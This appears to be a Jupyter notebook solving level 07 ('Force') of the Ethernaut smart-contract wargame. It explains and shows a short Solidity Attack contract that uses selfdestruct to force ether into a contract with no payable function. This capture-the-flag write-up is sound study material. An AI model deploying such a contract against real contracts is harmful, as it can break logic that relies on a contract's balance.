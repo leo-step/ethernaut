{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "title: (07) Force\n",
    "description: https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B\n",
    "show-code: True\n",
    "---"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](https://ethernaut.openzeppelin.com/imgs/BigLevel7.svg)\n",
    "# (07) Force\n",
    "## https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### We can force ether into the contract by using the selfdestruct method from another deployed contract that has a non-zero balance. Adapting code from https://solidity-by-example.org/hacks/self-destruct/, I sent a transaction with a positive value to the attack method of the Attack contract to increase the balance of Force."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "latex"
    }
   },
   "outputs": [],
   "source": [
    "// SPDX-License-Identifier: MIT\n",
    "pragma solidity ^0.8.0;\n",
    "\n",
    "contract Force {/*\n",
    "\n",
    "                   MEOW ?\n",
    "         /\\_/\\   /\n",
    "    ____/ o o \\\n",
    "  /~____  =ø= /\n",
    " (______)__m_m)\n",
    "\n",
    "*/}\n",
    "\n",
    "contract Attack {\n",
    "    Force force;\n",
    "\n",
    "    constructor(Force _force) {\n",
    "        force = Force(_force);\n",
    "    }\n",
    "\n",
    "    function attack() public payable {\n",
    "        address payable addr = payable(address(force));\n",
    "        selfdestruct(addr);\n",
    "    }\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
